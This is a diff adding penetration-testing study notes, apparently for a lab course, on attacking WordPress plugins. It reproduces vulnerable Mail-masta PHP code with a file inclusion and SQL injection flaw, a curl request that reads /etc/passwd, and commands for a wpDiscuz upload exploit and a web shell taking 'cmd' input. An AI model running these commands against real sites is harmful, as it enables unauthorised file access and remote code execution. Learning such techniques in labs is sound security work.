@@ -86,4 +86,41 @@ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=
 	* make sure to document and clean up
 * most vulns in wordpress are with the plugins (89%)
 * Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.
+
+**Mail-masta plugin***
+* Since 2016 it has suffered an unauthenticated SQL injection and a Local File Inclusion
+* Vulnerable code:
+```php
+<?php 
+
+include($_GET['pl']);
+global $wpdb;
+
+$camp_id=$_POST['camp_id'];
+$masta_reports = $wpdb->prefix . "masta_reports";
+$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");
+
+echo $count[0]->co;
+
+?>
+```
+* the `pl` parameter allows us to include a file without any type of input validation or sanitization
+	* Using this, we can include arbitrary files on the webserver
+* Exploit:
+```bash
+curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+```
+
+**wpDiscuz plugin**
+* The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution
+* Exploit script:
+	* can be downloaded from exploitdb
+```bash
+python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+```
+* may fail, but can still use curl to execute commands after the script was run:
+```bash
+curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+```
+* Make sure to cleanup the `.php` file left behind
 * 
